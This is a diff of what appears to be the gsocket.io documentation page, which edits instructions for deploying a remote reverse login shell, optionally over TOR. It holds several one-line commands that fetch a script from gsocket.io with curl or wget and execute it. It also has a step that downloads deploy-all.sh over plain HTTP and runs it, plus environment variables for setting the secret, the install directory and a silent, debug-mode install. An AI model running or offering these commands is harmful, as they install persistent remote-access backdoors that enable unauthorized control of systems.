@@ -2,9 +2,9 @@
 layout: default
 ---
 
-<p class="panel-note2" markdown="1">Can no longer connect to your deployed gs-netcat? Use this command >>*S=YourSecret bash -c "$(curl -fsSL gsocket.io/**xold**)"*<< or >>*S=YourSecret bash -c "$(wget -qO- gsocket.io/**xold**)"*<< to access your old session. [Click here to update to 1.4.32 or later]({{site.github.repository_url}}/blob/master/deploy/README-update.md).</p>
+<p class="panel-note2" markdown="1">Deploy a reverse login shell with a *single command* (fully automated) - and access the shell remotely - encrypted - and via TOR if you like.</p>
 
-Deploy a reverse login shell with a *single command* (fully automated) - and access the shell remotely - encrypted - and via TOR if you like. 
+
 
 > _This must be the quickest way to access a system_
 >                                                 -- anonymous
@@ -74,14 +74,21 @@ Deploy with a predefined secret. Try *curl* and fallback to *wget*:
 X=ExampleSecretChangeMe && (command -v curl >/dev/null && X=$X bash -c "$(curl -fsSL gsocket.io/x)" || X=$X bash -c "$(wget -qO- gsocket.io/x)")
 ```
   
-Deploy from self-extracting shell-script [deploy-all.sh](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh) without fetching any packages:
+Deploy from self-extracting shell-script [deploy-all.sh](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh) without fetching any packages and using good old plain HTTP:
 ```
-# wget https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh
-wget --no-hsts http://nossl.segfault.net/deploy-all.sh
-chmod 755 deploy-all.sh
+wget --no-hsts http://nossl.segfault.net/deploy-all.sh && \
+chmod 755 deploy-all.sh && \
 ./deploy-all.sh
-# Use "GS_UNDO=1 ./deploy-all.sh" to uninstall
 ```
+
+Useful environment variables:  
+
+|:---|:---|
+|X=|Set a predefined secret during installation|
+|GS_DSTDIR=|Set the installation directory. The default is to pick the most suitable automatically.|
+|GS_URL_BASE=|Use URL for static binaries. The default is https://github.com/hackerschoice/binary/raw/main/gsocket/bin/.|
+|GS_OSARCH=|Force architecture. The default is to pick the most suitable automatically.
+|GS_DEBUG=1|Verbose output and other debug related settings. Often used together with `GS_DEBUG=1 GS_NOSTART=1 GS_NOINST=1 bash -c "$(curl -fsSL gsocket.io/x)"`.|
 
 <p class="panel-note" markdown="1">Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).</p>
 
